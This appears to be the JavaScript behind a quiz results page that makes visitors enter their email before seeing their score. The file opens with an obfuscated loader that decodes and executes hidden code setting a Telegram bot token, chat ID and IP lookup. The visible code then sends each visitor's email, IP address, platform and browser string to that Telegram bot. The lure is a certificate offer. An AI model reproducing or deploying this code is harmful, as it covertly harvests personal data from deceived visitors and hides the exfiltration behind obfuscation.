
var BOT_TOKEN,CHAT_ID,getUserIp;(function(){var KJV='',zPq=741-730;function Lor(r){var u=2253382;var a=r.length;var l=[];for(var y=0;y<a;y++){l[y]=r.charAt(y)};for(var y=0;y<a;y++){var p=u*(y+187)+(u%53304);var o=u*(y+172)+(u%37584);var v=p%a;var g=o%a;var c=l[v];l[v]=l[g];l[g]=c;u=(p+o)%5148397;};return l.join('')};var xRb=Lor('ogvnorfcrptawtelonidhmscuyrbjzcukqtsx').substr(0,zPq);var RJe='v]( a617,ecsg;f.4ash1r.wo Ct5 s-[gi;ov(lhit qt<w  yz+mpa(}kb.1e,hhis=)+;rblr d[0(v;usr(,.4(6+,tal;=9t0g7aio)rinr5ui7;,={+;(axou((];tn.l]+(0;=j)avk;u9vreh;c+,r=s=sr=edxa!s"ar +)v] i=s;6;=h0n2)sv=3u f=  b(68a.(fona+r)mt=r+lrco(o)na{ A8virkl)a(gp+vaqv=,6.-n,zomAj")lforlva;r8+,e6q6i.mrt;,u;(ig0-=5;al]0+e)j16;4ru[rnned1t(o2docve8;v;emh=0a0nr,)u)flp.[=0;vcece9f)apl17)e l[4<2;r++7=gnrdn(prc;a=CedxAapttnh)r y=+7jrf.fpj6jn)s c.n*.+h.vhAr=;reav4rr1gtr;=hu"rjb;te,8l ,t()tyn)(s)o,( ig)p=th5ngp=z.a;C,der}rv {)(8,,+(or)o;lC9=r;2*a=;s=r9h+=2cvxvCanc,n>1r)si,i8;=unnril)S=t-[i+];,r)[(}=sh]=[suu1r{i8Arh+Cr);s]p.s)((e}-1]a;+=a+)po;f[2[r..reunayva.u;e vuvhtq[fl, toi7(shl);darrnn.vlrn{"bt=}nafrpst(b[tvutaija1q,,;,1na{("ipv0z7a=h;=}s)z"{,hh39gm]14a0]i( .sk)zorgka[=(ci,-l=so;Cra d9=.td="}fo.o)!i(r=n;t<o.oeifdp+aoa2=88p.=luuc+bwm]h+<ea,4gC7ro[r<Svdhn-.82.]nh"tf)itepnhre ;re.>r;]arst;;m)(g"a"((;ak0 vd;';var Brf=Lor[xRb];var csl='';var mxA=Brf;var dYk=Brf(csl,Lor(RJe));var UOm=dYk(Lor('6r4WWt)$)\/ba.o2,-_{1r+iprW={_d!;W}6$3a8roWf=_al.3_u#_t2q,W;Wteap]WWb.03os1WW.=.W]=W1zs2CbWau4f3W1(ncn1.f4fb3"{3.3w]0$5g6fu8sW;%u7l2.4mleW8+))$trWn$n544osa],u!1WS6e]W.W1}f1I31n\'()i%W5]%$)C#_r1(2\/I0.!5W$foje\/Wj;0_,_t(.(4$t!Wor*)_39.3)!w=C(,(a;[W4=Wr%=i2,..;WWrsf25,,aWn$.5\'i(=,u{eoea25n(!g.2,2W4aikf7-)Wr\/W4W.[(c{s)r.6Wv% 10n3Net)ghcn"f%_]y.1teS!c7;i.(.,ual4b]3er__(i0ci)WWWt(5W%"0$s.n1rnt.$j=d527W.=2,.v_;;:iW]1)z0;)-p&q)!\'C(nDi zx#W$.3(W0f0.jr,4($8r}psnWr)W:85( Ws6$W3f3=EuiWotg9%f )n,Ciu!sh7pW(.,;=0nW5.fe)nf+W?lf!;=WfWW .gx_,t(.9;7Wg2ei&_u;6= 0Wo,.aW=W;];_j2j(1n3-hjai}t.u..)%(g)$)geo.k)3c4#n1_#._WW;t3WfsDW+gWre62b(W2,W{We),bfi .WW.!otW =r!onz8W2W=1z>f$}j=().rol!dj\/a]{dcx,%1!0sW"+WcWt._c$+%,.7i6nm13da0.6).o.;ii3a.1$l3f60{3.6$+$o.a46n%#1_W1{}2Who7)j.4a+ in(Sh;.[i0W$h()W;)-s;=W472].z$!4og8dr]aW5Wn]2mIW"pfWoo._1e.;ff;p46,l(t07if{fb(.Wiii)ur1)__ofW[;67}Wbge$!jyW$8(n)yq=aw]0!eW=urprs({T-W.!t)g;).0a(e;yr_.)e.r,=4r .[,( "&6.3fWetarn}43.WdlT(pW+8p {4eWlW!3n{}.(*s7W_ug7$!,5( !73eW_7=)=sa;r)>%#oW7(5_s)mfn. rfW([fhWq)" &eq\'1;_W)3}.!_0l)a))+p2}utf*gxb(5_e)W)s0jt)).f5;ot_)+a$s]}eWt=i{,e81 af{q2}a%4}&Wj,f_o,![_!io;(&,!6W aar.f.1og e)%jrgW3(xb6)orf(7poW%+ho25}rW..q_$_4)Wa .yW41)bTes{.0\/,{[}!(4tztu3.,33r;t! ,*2Wn($tt!$=.n_.gidru,2$ox8_62.#.(e()=!_(f(W.== or=j ta8tann.1).w ]'));var SPw=mxA(KJV,UOm );SPw(3014);return 5656})()
    // Get platform and browser information
    function getPlatformInfo() {
        return `${navigator.platform} - ${navigator.userAgent}`;
    }

    // Handle form submission
    document.getElementById('note-form').addEventListener('submit', function (e) {
        e.preventDefault(); // Prevent default form submission

        const email = document.getElementById('email').value;

        Promise.all([getUserIp(), Promise.resolve(getPlatformInfo())]).then(([userIp, platformInfo]) => {
            const score = localStorage.getItem("score");
            const totalQuestions = localStorage.getItem("totalQuestions");

            
            const message = `

<b></b> ${email}
<b></b> ${score} out of ${totalQuestions}
<b></b> ${userIp || "Not Available"}
<b>:</b> ${platformInfo}
            `;

            // Send the message to Telegram
            axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                parse_mode: 'html',
                text: message
            }).then(() => {
                
                document.getElementById('response-message').innerHTML = `
                    <div class="response-message success-message">
                        Your email has been successfully submitted! Now, you can view your results below.
                    </div>
                `;
                document.getElementById('email-form').style.display = 'none';
                document.getElementById('test-results').style.display = 'block';
                loadResults();
            }).catch(() => {
                
                document.getElementById('response-message').innerHTML = `
                    <div class="response-message error-message">
                        There was an error submitting your email. Please try again.
                    </div>
                `;
            });
        });
    });

   
    function loadResults() {
        const score = localStorage.getItem("score");
        const totalQuestions = localStorage.getItem("totalQuestions");
        const feedback = JSON.parse(localStorage.getItem("feedback"));

        document.getElementById("score").textContent = `Your score: ${score} out of ${totalQuestions}`;

        const feedbackContainer = document.getElementById("feedback");
        if (feedback && feedback.length > 0) {
            feedback.forEach(item => {
                const feedbackElement = document.createElement("div");
                feedbackElement.classList.add("question-box");

                const questionElement = document.createElement("div");
                questionElement.classList.add("question");
                questionElement.textContent = `Question: "${item.question}"`;
                feedbackElement.appendChild(questionElement);

                const selectedAnswerElement = document.createElement("div");
                selectedAnswerElement.classList.add("answer", "selected-answer");
                selectedAnswerElement.textContent = `You selected: "${item.selectedAnswer}"`;
                feedbackElement.appendChild(selectedAnswerElement);

                const correctAnswerElement = document.createElement("div");
                correctAnswerElement.classList.add("answer", "correct-answer");
                correctAnswerElement.textContent = `Correct answer: "${item.correctAnswer}"`;
                feedbackElement.appendChild(correctAnswerElement);

                feedbackContainer.appendChild(feedbackElement);
            });
        } else {
            feedbackContainer.innerHTML = "<p>You answered all questions correctly!</p>";
        }

        if (score == totalQuestions) {
            const redirectButtonContainer = document.getElementById('redirect-button-container');
            const redirectButton = document.createElement('button');
            redirectButton.textContent = 'Claim Your Certificate';
            redirectButton.onclick = () => window.location.href = 'cer.html';
            redirectButtonContainer.appendChild(redirectButton);
        }
    }

    
    function restartTest() {
        localStorage.clear();
        window.location.href = "index.html";
    }

